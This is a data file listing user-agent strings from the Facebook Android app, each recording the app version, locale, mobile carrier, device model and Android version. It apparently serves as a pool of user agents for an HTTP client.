"[FBAN/FB4A;FBAV/306.1.0.40.119;FBBV/273922314;FBDM/{density=2.75,width=1080,height=2110};FBLC/cs_CZ;FBRV/274973169;FBCR/T-Mobile CZ;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/M2003J15SC;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/306.1.0.40.119;FBBV/273922314;FBDM/{density=2.75,width=1080,height=2131};FBLC/cs_CZ;FBRV/274999374;FBCR/T-Mobile CZ;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 7;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/305.1.0.40.120;FBBV/272401210;FBDM/{density=2.75,width=1080,height=2134};FBLC/cs_CZ;FBRV/274073372;FBCR/Vodafone CZ;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/M2004J19C;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/306.1.0.40.119;FBBV/273922314;FBDM/{density=2.75,width=1080,height=2130};FBLC/cs_CZ;FBRV/275118409;FBCR/Vodafone CZ;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 8T;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/307.0.0.40.111;FBBV/274797441;FBDM/{density=3.0,width=1080,height=2129};FBLC/cs_CZ;FBRV/275156670;FBCR/O2.CZ;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Mi 9 SE;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/303.0.0.30.122;FBBV/269803856;FBDM/{density=2.0,width=720,height=1344};FBLC/en_GB;FBRV/271519795;FBCR/;FBMF/TCL;FBBD/TCL;FBPN/com.facebook.katana;FBDV/REVVL 2;FBSV/8.1.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/307.0.0.40.111;FBBV/274797441;FBDM/{density=2.75,width=1080,height=2168};FBLC/it_IT;FBRV/275364963;FBCR/CoopVoce;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi Note 9S;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/275.0.0.49.127;FBBV/221372446;FBDM/{density=3.0,width=1080,height=2090};FBLC/it_IT;FBRV/225933467;FBCR/1 MOBILE;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/JNY-LX1;FBSV/10;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/294.0.0.39.118;FBBV/253340670;FBDM/{density=2.0,width=720,height=1384};FBLC/it_IT;FBRV/0;FBCR/ho.;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J600FN;FBSV/9;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/300.2.0.58.129;FBBV/265244930;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBRV/267438968;FBCR/Telstra;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J250G;FBSV/7.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/307.0.0.40.111;FBBV/274797384;FBDM/{density=2.0,width=720,height=1424};FBLC/th_Qaau_TH;FBRV/275412984;FBCR/AIS;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/CPH1901;FBSV/8.1.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/307.0.0.40.111;FBBV/274797441;FBDM/{density=3.0,width=1080,height=2132};FBLC/en_US;FBRV/275489882;FBCR/Jio 4G;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/CPH1911;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/307.0.0.40.111;FBBV/274797441;FBDM/{density=2.625,width=1080,height=2131};FBLC/cs_CZ;FBRV/276081113;FBCR/O2 Family;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A505FN;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/306.1.0.40.119;FBBV/273922315;FBDM/{density=3.5,width=1440,height=2792};FBLC/en_US;FBRV/275142282;FBCR/HOME;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G965U;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/307.0.0.40.111;FBBV/274797387;FBDM/{density=4.0,width=1440,height=2392};FBLC/ru_RU;FBRV/276198575;FBCR/Telekom.de;FBMF/LGE;FBBD/lge;FBPN/com.facebook.katana;FBDV/LG-H850;FBSV/7.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/307.0.0.40.111;FBBV/274797113;FBDM/{density=2.625,width=1080,height=2137};FBLC/cs_CZ;FBRV/276333355;FBCR/T-Mobile CZ;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/motorola one zoom;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/307.0.0.40.111;FBBV/274797441;FBDM/{density=3.0,width=1080,height=2265};FBLC/cs_CZ;FBRV/276389460;FBCR/T-Mobile CZ;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/VOG-L29;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/307.0.0.40.111;FBBV/274797441;FBDM/{density=3.0,width=1080,height=2107};FBLC/cs_CZ;FBRV/276389460;FBCR/T-Mobile CZ;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/MAR-LX1A;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/307.0.0.40.111;FBBV/274797441;FBDM/{density=2.625,width=1080,height=2131};FBLC/cs_CZ;FBRV/276389460;FBCR/O2.CZ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A505FN;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/307.0.0.40.111;FBBV/274797441;FBDM/{density=2.75,width=1080,height=2130};FBLC/cs_CZ;FBRV/276389460;FBCR/Vodafone CZ;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 8T;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/306.1.0.40.119;FBBV/273922314;FBDM/{density=2.625,width=1080,height=2134};FBLC/de_DE;FBRV/275142282;FBCR/Salt;FBMF/OnePlus;FBBD/OnePlus;FBPN/com.facebook.katana;FBDV/ONEPLUS A6013;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/307.0.0.40.111;FBBV/274797441;FBDM/{density=2.75,width=1080,height=2110};FBLC/cs_CZ;FBRV/276389460;FBCR/T-Mobile CZ;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/M2003J15SC;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/308.0.0.42.118;FBBV/275987656;FBDM/{density=1.75,width=720,height=1448};FBLC/pt_BR;FBRV/276404237;FBCR/Claro BR;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A217M;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/308.0.0.42.118;FBBV/275987624;FBDM/{density=3.0,width=1080,height=1920};FBLC/cs_CZ;FBRV/276592387;FBCR/O2.CZ;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 4;FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/308.0.0.42.118;FBBV/275987658;FBDM/{density=2.625,width=1080,height=2186};FBLC/cs_CZ;FBRV/276569362;FBCR/Vodafone CZ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A515F;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/308.0.0.42.118;FBBV/275987594;FBDM/{density=3.0,width=1080,height=2076};FBLC/cs_CZ;FBRV/276404237;FBCR/O2.CZ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A750FN;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/306.1.0.40.119;FBBV/273921911;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBRV/274807707;FBCR/BSNL Mobile;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 4;FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/308.0.0.42.118;FBBV/275987658;FBDM/{density=2.75,width=1080,height=2168};FBLC/cs_CZ;FBRV/277267055;FBCR/T-Mobile CZ;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi Note 9 Pro;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/308.0.0.42.118;FBBV/275987658;FBDM/{density=3.0,width=1080,height=2139};FBLC/cs_CZ;FBRV/277249070;FBCR/T-Mobile CZ;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/POT-LX1;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/308.0.0.42.118;FBBV/275987658;FBDM/{density=3.0,width=1080,height=2020};FBLC/cs_CZ;FBRV/277454707;FBCR/O2.CZ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G970F;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/308.0.0.42.118;FBBV/275987623;FBDM/{density=2.0,width=720,height=1280};FBLC/cs_CZ;FBRV/277531280;FBCR/O2 Family;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Redmi 4X;FBSV/7.1.2;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/308.0.0.42.118;FBBV/275987658;FBDM/{density=3.0,width=1080,height=2110};FBLC/cs_CZ;FBRV/277579258;FBCR/T-Mobile CZ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A405FN;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/308.0.0.42.118;FBBV/275987631;FBDM/{density=2.75,width=1080,height=2131};FBLC/cs_CZ;FBRV/277629728;FBCR/T-Mobile CZ;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 7;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/308.0.0.42.118;FBBV/275987624;FBDM/{density=3.0,width=1080,height=1776};FBLC/sv_SE;FBRV/277662387;FBCR/hallon;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/Moto G (5S) Plus;FBSV/8.1.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/308.0.0.42.118;FBBV/275987631;FBDM/{density=3.0,width=1080,height=2128};FBLC/cs_CZ;FBRV/277553532;FBCR/T-Mobile CZ;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/INE-LX1;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/308.0.0.42.118;FBBV/275987658;FBDM/{density=3.0,width=1080,height=2020};FBLC/cs_CZ;FBRV/277740997;FBCR/O2.CZ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G970F;FBSV/11;FBOP/19;FBCA/arm64-v8a:;]",
"Dalvik/2.1.0 (Linux; U; Android 9; Kirin Treble Build/PQ2A.190405.003) [FBAN/FB4A;FBAV/306.1.0.40.119;FBPN/com.facebook.katana;FBLC/ru_US;FBBV/273922298;FBCR/life:) BY;FBMF/HUAWEI;FBBD/Huawei;FBDV/Kirin Treble;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=2.4,width=1080,height=2075};FB_FW/1;FBRV/275142282;]",
"[FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444780;FBDM/{density=3.0,width=1080,height=2076};FBLC/en_US;FBRV/277806148;FBCR/Mint;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N960U;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444762;FBDM/{density=2.75,width=1080,height=2130};FBLC/cs_CZ;FBRV/278313726;FBCR/T-Mobile CZ;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 8T;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/307.0.0.40.111;FBBV/274797148;FBDM/{density=3.0,width=1080,height=2043};FBLC/cs_CZ;FBRV/276389460;FBCR/T-Mobile CZ;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Mi A2 Lite;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/301.0.0.37.477;FBBV/267342913;FBDM/{density=2.625,width=1080,height=2069};FBLC/en_US;FBRV/269123057;FBCR/Verizon ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N976V;FBSV/11;FBBK/1;FBOP/1;FBCA/arm64-v8a",
"[FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444780;FBDM/{density=2.625,width=1080,height=2186};FBLC/pt_BR;FBRV/278548443;FBCR/Claro BR;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A515F;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/306.1.0.40.119;FBBV/273922313;FBDM/{density=1.75,width=720,height=1361};FBLC/de_DE;FBRV/275142282;FBCR/vodafone.de;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G973F;FBSV/11;FBOP/19;FBCA/arm64-v8a",
"[FBAN/FB4A;FBAV/305.1.0.40.120;FBBV/272401210;FBDM/{density=2.625,width=1080,height=2042};FBLC/de_DE;FBRV/0;FBCR/vodafone.de;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G973F;FBSV/11;FBBK/1;FBOP/19;FBCA/arm64-v8a",
"[FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444780;FBDM/{density=2.625,width=1080,height=2131};FBLC/cs_CZ;FBRV/278653834;FBCR/O2 Family;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A505FN;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444778;FBDM/{density=2.0,width=720,height=1369};FBLC/ru_RU;FBRV/278696245;FBCR/MTS RUS;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi 7;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/303.0.0.30.122;FBBV/269803856;FBDM/{density=2.0,width=720,height=1440};FBLC/ru_RU;FBRV/271519795;FBCR/KYIVSTAR;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/DUB-LX1;FBSV/8.1.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444755;FBDM/{density=1.2125,width=720,height=1417};FBLC/pt_BR;FBRV/278492457;FBCR/Oi;FBMF/LGE;FBBD/lge;FBPN/com.facebook.katana;FBDV/LM-X430;FBSV/9;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444772;FBDM/{density=1.875,width=720,height=1458};FBLC/cs_CZ;FBRV/278680025;FBCR/O2-CZ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A426B;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444755;FBDM/{density=1.30625,width=720,height=1280};FBLC/en_US;FBRV/0;FBCR/Jio 4G;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Redmi 5A;FBSV/8.1.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/287.0.0.50.119;FBBV/243660812;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBRV/245218954;FBCR/airtel;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Redmi 5A;FBSV/7.1.2;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[fban/fb4a;fbav/308.0.0.42.118;fbbv/275987658;fbdm/{density=3.5width=1440height=2831};fblc/en_us;fbrv/277740997;fbcr/verizon wireless;fbmf/samsung;fbbd/samsung;fbpn/com.facebook.katana;fbdv/sm-n986u;fbsv/11;fbop/1;fbca/arm64-v8a:;",
"[FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444780;FBDM/{density=3.0,width=1080,height=2265};FBLC/cs_CZ;FBRV/279985922;FBCR/O2.CZ;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/ELE-L29;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444719;FBDM/{density=2.0,width=720,height=1184};FBLC/en_US;FBRV/0;FBCR/airtel;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/Moto E (4) Plus;FBSV/7.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/310.0.0.50.118;FBBV/278533668;FBDM/{density=3.0,width=1080,height=2060};FBLC/cs_CZ;FBRV/280568423;FBCR/T-Mobile CZ;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/ANE-LX1;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/310.0.0.50.118;FBBV/278533704;FBDM/{density=2.75,width=1080,height=2180};FBLC/cs_CZ;FBRV/280595527;FBCR/T-Mobile CZ;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/M2007J3SY;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/310.0.0.50.118;FBBV/278533704;FBDM/{density=2.625,width=1080,height=2186};FBLC/cs_CZ;FBRV/280618835;FBCR/O2.CZ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A515F;FBSV/11;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/310.0.0.50.118;FBBV/278533668;FBDM/{density=2.75,width=1080,height=2030};FBLC/cs_CZ;FBRV/280530471;FBCR/Vodafone CZ;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 5;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/311.0.0.44.117;FBBV/280307956;FBDM/{density=3.0,width=1080,height=2107};FBLC/cs_CZ;FBRV/0;FBCR/T-Mobile CZ;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/MAR-LX1A;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/310.0.0.50.118;FBBV/278533704;FBDM/{density=3.0,width=1080,height=2076};FBLC/cs_CZ;FBRV/280530471;FBCR/Vodafone CZ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G960F;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/311.0.0.44.117;FBBV/280307938;FBDM/{density=3.0,width=1080,height=2137};FBLC/cs_CZ;FBRV/0;FBCR/T-Mobile CZ;FBMF/HUAWEI;FBBD/HONOR;FBPN/com.facebook.katana;FBDV/JSN-L21;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/310.0.0.50.118;FBBV/278533704;FBDM/{density=2.75,width=1080,height=2131};FBLC/cs_CZ;FBRV/280649971;FBCR/Vodafone CZ;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 7;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/310.0.0.50.118;FBBV/278533659;FBDM/{density=2.0,width=720,height=1344};FBLC/cs_CZ;FBRV/280683996;FBCR/T-Mobile CZ;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi 6;FBSV/9;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/311.0.0.44.117;FBBV/280307956;FBDM/{density=2.625,width=1080,height=2131};FBLC/fr_FR;FBRV/281318489;FBCR/Orange F;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A505FN;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/311.0.0.44.117;FBBV/280307956;FBDM/{density=2.625,width=1080,height=2183};FBLC/cs_CZ;FBRV/281339579;FBCR/O2-CZ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A715F;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/311.0.0.44.117;FBBV/280307931;FBDM/{density=2.0,width=720,height=1369};FBLC/pt_BR;FBRV/281357705;FBCR/Claro BR;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A107M;FBSV/9;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/311.0.0.44.117;FBBV/280307956;FBDM/{density=2.75,width=1080,height=2130};FBLC/cs_CZ;FBRV/281417942;FBCR/T-Mobile CZ;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 8T;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/311.0.0.44.117;FBBV/280307931;FBDM/{density=2.0,width=720,height=1280};FBLC/cs_CZ;FBRV/281417942;FBCR/Vodafone CZ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J710F;FBSV/8.1.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/311.0.0.44.117;FBBV/280307947;FBDM/{density=2.0,width=720,height=1384};FBLC/pl_PL;FBRV/0;FBCR/T-Mobile.pl;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J600FN;FBSV/10;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/311.0.0.44.117;FBBV/280307956;FBDM/{density=3.0,width=1080,height=2020};FBLC/cs_CZ;FBRV/281866937;FBCR/Vodafone CZ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G970F;FBSV/11;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/311.0.0.44.117;FBBV/280307931;FBDM/{density=2.0,width=720,height=1422};FBLC/cs_CZ;FBRV/281900479;FBCR/T-Mobile;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/MRD-LX1;FBSV/9;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/312.0.0.45.117;FBBV/281505338;FBDM/{density=2.625,width=1080,height=1920};FBLC/en_US;FBRV/283309601;FBCR/Verizon ;FBMF/samsung;FBBD/Verizon;FBPN/com.facebook.katana;FBDV/SM-N920V;FBSV/7.0;FBBK/1;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"Created Apr 13, 2021, 2:01 PM Updated Apr 13, 2021, 2:01 PM IP Address 103.25.250.236 Browser Dalvik/2.1.0 (Linux; U; Android 10; SM-A515F Build/QP1A.190711.020) [FBAN/FB4A;FBAV/310.0.0.50.118;FBPN/com.facebook.katana;FBLC/en_GB;FBBV/278533704;FBCR/airtel;FBMF/samsung;FBBD/samsung;FBDV/SM-A515F;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=2.625,width=1080,height=2186};FB_FW/1;FBRV/0;]",
"[FBAN/FB4A;FBAV/303.0.0.30.122;FBBV/269803857;FBDM/{density=3.0,width=1080,height=1812};FBLC/it_IT;FBRV/271519795;FBCR/vodafone IT;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/VIE-L09;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/312.0.0.45.117;FBBV/281505334;FBDM/{density=3.375,width=1080,height=1920};FBLC/en_US;FBRV/283364436;FBCR/Sprint;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G930P;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/313.0.0.35.119;FBBV/282998037;FBDM/{density=3.0,width=1080,height=2060};FBLC/cs_CZ;FBRV/284785234;FBCR/T-Mobile CZ;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/ANE-LX1;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444780;FBDM/{density=3.0,width=1080,height=2145};FBLC/de_DE;FBRV/0;FBCR/o2 - de;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/LYA-L29;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444780;FBDM/{density=3.0,width=1080,height=2076};FBLC/de_DE;FBRV/278218861;FBCR/smartmobil.de;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G960F;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444740;FBDM/{density=3.0,width=1080,height=2076};FBLC/de_DE;FBRV/278453580;FBCR/Telekom.de;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G960F;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444752;FBDM/{density=1.75,width=1200,height=1920};FBLC/de_DE;FBRV/278040498;FBCR/;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-T580;FBSV/8.1.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444780;FBDM/{density=2.625,width=1080,height=2198};FBLC/de_DE;FBRV/278363061;FBCR/vodafone.de;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A705FN;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444780;FBDM/{density=3.0,width=1080,height=2076};FBLC/de_DE;FBRV/278596578;FBCR/MEDIONmobile;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G960F;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444639;FBDM/{density=2.625,width=1080,height=2094};FBLC/de_DE;FBRV/278578834;FBCR/mobilcom-debitel;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A750FN;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444756;FBDM/{density=3.0,width=1080,height=1776};FBLC/de_DE;FBRV/278838978;FBCR/Tchibo;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/E6833;FBSV/5.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444762;FBDM/{density=3.0,width=1080,height=2076};FBLC/de_DE;FBRV/278915484;FBCR/MEDIONmobile;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G950F;FBSV/9;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444780;FBDM/{density=2.625,width=1080,height=2210};FBLC/de_DE;FBRV/279458745;FBCR/;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N986B;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/312.0.0.45.117;FBBV/281505358;FBDM/{density=3.0,width=1080,height=2076};FBLC/de_DE;FBRV/282915804;FBCR/MEDIONmobile;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G950F;FBSV/9;FBOP/19;FBCA/arm64-v8a:;]",
